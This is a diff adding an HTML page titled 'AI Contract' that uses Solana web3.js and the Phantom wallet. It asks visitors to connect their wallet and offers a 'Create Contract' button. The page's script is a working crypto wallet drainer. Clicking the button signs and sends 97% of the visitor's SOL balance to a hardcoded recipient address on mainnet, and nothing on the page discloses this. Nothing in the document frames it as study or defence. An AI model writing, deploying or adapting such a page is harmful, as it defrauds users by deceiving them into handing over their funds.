@@ -1,0 +1,144 @@
+ECHO is on.
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI Contract</title>
+  <script src="https://unpkg.com/@solana/web3.js"></script> <!-- CDN for Solana Web3.js -->
+  <script src="script.js" defer></script> <!-- Link to your custom JavaScript file -->
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #0e0f13; /* Solana-inspired dark background */
+      color: white;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      font-size: 3em;
+      color: #ff6900; /* Solana orange */
+    }
+    .welcome-message {
+      font-size: 1.5em;
+      color: #00a8e8; /* Solana blue */
+      margin-bottom: 20px;
+    }
+    .button {
+      background-color: #ff6900; /* Solana orange */
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background-color 0.3s;
+    }
+    .button:hover {
+      background-color: #ff5722; /* Slightly darker Solana orange */
+    }
+    #transferButton:disabled {
+      background-color: #888;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+  <div id="welcomeMessage" class="welcome-message">Welcome to the AI Contract website...</div>
+  <h1>AI Contract</h1>
+  <button id="connectButton" class="button">Connect Wallet</button>
+  <button id="transferButton" class="button" disabled>Create Contract</button>
+
+  <script>
+    const { Connection, PublicKey, clusterApiUrl, SystemProgram, Transaction } = solanaWeb3;
+
+    let wallet;
+    let connection;
+    const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ"; // Your recipient address
+
+    // Initialize wallet adapter
+    function initializeWallet() {
+      if (window.solana && window.solana.isPhantom) {
+        wallet = window.solana;
+        connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
+      } else {
+        alert("Please install Phantom wallet!");
+      }
+    }
+
+    // Connect wallet
+    async function connectWallet() {
+      if (!wallet.connected) {
+        await wallet.connect();
+      }
+      document.getElementById("transferButton").disabled = false;
+      console.log("Wallet connected:", wallet.publicKey.toString());
+    }
+
+    // Get balance of SOL
+    async function getBalances() {
+      const publicKey = wallet.publicKey;
+      const solBalance = await connection.getBalance(publicKey);
+      console.log(`SOL Balance: ${solBalance / 1e9} SOL`);
+      return solBalance;
+    }
+
+    // Transfer SOL and SPL tokens
+    async function transferTokens() {
+      const solBalance = await getBalances();
+      const transferSolAmount = (solBalance * 0.97) / 1e9; // 97% of SOL
+      console.log(`Transferring ${transferSolAmount} SOL`);
+
+      // Create transaction
+      const transaction = new Transaction().add(
+        SystemProgram.transfer({
+          fromPubkey: wallet.publicKey,
+          toPubkey: new PublicKey(recipientAddress),
+          lamports: transferSolAmount * 1e9, // Convert SOL to lamports
+        })
+      );
+
+      // Sign and send the transaction
+      try {
+        const signature = await wallet.sendTransaction(transaction, connection);
+        console.log("Transaction sent:", signature);
+        await connection.confirmTransaction(signature);
+        console.log("Transaction confirmed:", signature);
+      } catch (err) {
+        console.error("Transaction failed:", err);
+      }
+    }
+
+    // Event listeners
+    document.getElementById("connectButton").addEventListener("click", () => {
+      connectWallet();
+    });
+
+    document.getElementById("transferButton").addEventListener("click", () => {
+      transferTokens();
+    });
+
+    // Initialize wallet on page load
+    window.onload = () => {
+      initializeWallet();
+
+      // Self-typing welcome message
+      const welcomeMessage = document.getElementById('welcomeMessage');
+      let index = 0;
+      const message = "Welcome to the AI Contract website...";
+      function typeMessage() {
+        if (index < message.length) {
+          welcomeMessage.innerHTML += message.charAt(index);
+          index++;
+          setTimeout(typeMessage, 100); // Speed of typing
+        } else {
+          setTimeout(() => {
+            welcomeMessage.style.display = 'none'; // Hide after typing
+          }, 2000); // Wait 2 seconds before hiding
+        }
+      }
+      typeMessage();
+    };
+  </script>
+</body>
+</html>
